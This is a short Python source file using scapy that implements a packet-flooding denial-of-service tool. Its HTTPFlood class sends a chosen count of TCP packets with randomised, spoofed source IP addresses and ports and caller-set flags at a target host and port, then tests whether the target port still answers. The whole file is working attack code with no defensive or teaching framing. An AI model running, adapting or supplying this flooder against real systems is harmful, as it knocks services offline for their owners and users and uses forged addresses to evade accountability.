import random
from scapy.all import *
import socket


def SpoofIP():
	return "%s.%s.%s.%s" %(random.randint(1,255),random.randint(1, 255),random.randint(1, 255),random.randint(1, 255))

def SpoofPort():
	return random.randint(10000,65535)

def isAlive(dst,port):
	s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
	result = s.connect_ex((dst,int(port)) )
	if result == 0:
		print "{} {} is open".format(dst,port)
	else:
		print "{} {} is not open".format(dst,port)


class HTTPFlood():
	def __init__(self,dst,port,flag,count):
		self.dst ,self.port , self.flag ,self.count = dst ,port , flag , count
	def Start(self):
		for i in range(int(self.count)):
			self.Attack()
		isAlive(self.dst, self.port)

	def Attack(self):
		src_ip = SpoofIP()
		src_port = SpoofPort()
		network_layer = IP(src=src_ip, dst=self.dst)
		transport_layer = TCP(sport=int(src_port), dport=int(self.port), flags=str(self.flag))
		data = "This is sample"
		send(network_layer / transport_layer / Raw(load=data), verbose=False)
